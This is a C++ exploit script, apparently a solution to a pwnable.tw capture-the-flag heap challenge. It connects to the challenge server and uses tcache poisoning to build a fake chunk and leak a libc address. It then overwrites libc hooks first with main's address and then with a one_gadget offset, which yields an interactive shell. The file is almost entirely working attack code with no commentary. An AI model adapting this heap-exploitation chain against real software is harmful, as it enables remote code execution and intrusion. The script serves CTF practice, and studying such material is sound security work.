#include "pwntools.h"
#include <iostream>
using namespace pack;

Remote io("chall.pwnable.tw", 10207);

#define NAME 0x00602060
#define STDOUT 0x7fa92d63a760
#define ADDRESS_HOLDER 0x00602088
#define STDERR 0x00000602040
#define FAKECHUNK 0x602070
#define MAIN 0x00400bc7
#define _free() io.sendafter("choice :","2")
#define info() io.sendafter("choice :","3")

void initname(const std::string &name = "BBBBBBBBBBB") {
    io.sendafter("Name:",name);
}

void alloc(int size, const std::string &content) {
	io.sendafter("choice :", "1");
	io.sendafter("Size:", std::to_string(size));
	io.sendafter("Data:", content);
}

int main(void) {
    initname(p64(0)+p64(0x30+1));
    alloc(5, "P");
    _free();
    alloc(33, "P");

    _free();
    _free();
    alloc(50, "P");
    _free();

    uint64_t offset = 0x18;
    std::string chunk("P", offset);
    chunk += p64(0x31);
    chunk += p64(STDERR);
    for(int i=0;i<4;++i) chunk+= p64(0x71);

    chunk += p64(0x41);
    chunk += p64(ADDRESS_HOLDER);
    alloc(5, chunk);

    alloc(33, "P");
    alloc(33, "\x80");
    alloc(50, "P");
    alloc(50, p64(NAME+16));

    _free();
    info();
    std::string rcv;
    rcv.resize(10, 0);
    rcv += "$";
    
    uint64_t LEAK = u64(io.recvuntil(rcv).substr(22, 8));
    uint64_t libc_address = LEAK - 0x3ec680;
    printf("[+] Leaked libc: %p\n", (void *)libc_address);
    alloc(90, "P");
    alloc(90, "P");

    _free();
    _free();
    alloc(90, p64(libc_address+6397792));
    alloc(90, "P");
    alloc(90, p64(MAIN));

    io.sendafter("choice :","4");
    initname();
    puts("[+] Returned to main");
    alloc(150, "P");
    alloc(150, "P");

    _free();
    _free();
    alloc(150, p64(libc_address + 0x3ebc30));
    alloc(150, "P");
    alloc(150,p64(libc_address + 0xe569f));

    io.sendafter("choice :", "1");
    io.sendafter("Size:", "hehe");
    io.interactive();
}
